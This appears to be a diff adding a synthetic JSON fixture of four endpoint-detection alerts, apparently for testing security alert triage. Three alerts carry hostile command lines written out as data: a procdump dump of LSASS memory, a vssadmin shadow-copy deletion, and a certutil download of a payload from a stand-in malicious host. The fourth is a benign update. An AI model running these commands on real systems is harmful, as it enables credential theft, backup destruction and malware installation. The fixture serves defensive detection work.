@@ -1,0 +1,94 @@
+﻿[
+  {
+    "id": "ALT-2026-8801",
+    "timestamp": "2026-09-03T10:14:22Z",
+    "hostname": "FINANCE-WS-04",
+    "source": "AegisEDR Sensor",
+    "alert_type": "SUSPICIOUS_PROCESS_EXECUTION",
+    "severity": "CRITICAL",
+    "description": "Suspicious execution of cmd.exe attempting to dump LSASS memory process into dump file.",
+    "process": {
+      "name": "procdump.exe",
+      "pid": 4812,
+      "parent_name": "powershell.exe",
+      "parent_pid": 3204,
+      "command_line": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
+      "file_hash": "44d88612fea8a8f36de82e1278abb02f",
+      "user": "DOMAIN\\jsmith"
+    },
+    "network": {
+      "destination_ip": "185.220.101.5",
+      "destination_port": 443,
+      "protocol": "TCP"
+    }
+  },
+  {
+    "id": "ALT-2026-8802",
+    "timestamp": "2026-09-03T10:22:15Z",
+    "hostname": "DOMAIN-DC-01",
+    "source": "Windows Security Event Log",
+    "alert_type": "SHADOW_COPY_DELETION",
+    "severity": "CRITICAL",
+    "description": "Attempt to purge Volume Shadow Copies using native administrative utility.",
+    "process": {
+      "name": "vssadmin.exe",
+      "pid": 5920,
+      "parent_name": "cmd.exe",
+      "parent_pid": 5816,
+      "command_line": "vssadmin.exe delete shadows /all /quiet",
+      "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "user": "NT AUTHORITY\\SYSTEM"
+    },
+    "network": {
+      "destination_ip": "194.26.29.112",
+      "destination_port": 8080,
+      "protocol": "TCP"
+    }
+  },
+  {
+    "id": "ALT-2026-8803",
+    "timestamp": "2026-09-03T10:29:40Z",
+    "hostname": "DEV-LAPTOP-12",
+    "source": "AegisEDR Network Monitor",
+    "alert_type": "LOLBIN_DOWNLOAD_CRADLE",
+    "severity": "HIGH",
+    "description": "Living-off-the-Land binary (Certutil) invoked with URL cache parameters to fetch external executable.",
+    "process": {
+      "name": "certutil.exe",
+      "pid": 7114,
+      "parent_name": "explorer.exe",
+      "parent_pid": 1102,
+      "command_line": "certutil.exe -urlcache -split -f http://evil-payload-distribution.com/payload.exe C:\\Users\\Public\\update.exe",
+      "file_hash": "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0",
+      "user": "CORP\\developer1"
+    },
+    "network": {
+      "destination_ip": "91.240.118.172",
+      "destination_port": 80,
+      "protocol": "TCP"
+    }
+  },
+  {
+    "id": "ALT-2026-8804",
+    "timestamp": "2026-09-03T10:35:01Z",
+    "hostname": "HR-WORKSTATION",
+    "source": "AegisEDR Sensor",
+    "alert_type": "BENIGN_ADMIN_ACTIVITY",
+    "severity": "INFO",
+    "description": "Standard background software update executed by legitimate administrative management tool.",
+    "process": {
+      "name": "GoogleUpdate.exe",
+      "pid": 2044,
+      "parent_name": "services.exe",
+      "parent_pid": 680,
+      "command_line": "\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /c",
+      "file_hash": "2fbb7b5bcf8e0f96860d5b4e9f7435f1fbe7bdfc28258e6e584f3e6a718c5e69",
+      "user": "NT AUTHORITY\\SYSTEM"
+    },
+    "network": {
+      "destination_ip": "142.250.190.46",
+      "destination_port": 443,
+      "protocol": "TCP"
+    }
+  }
+]
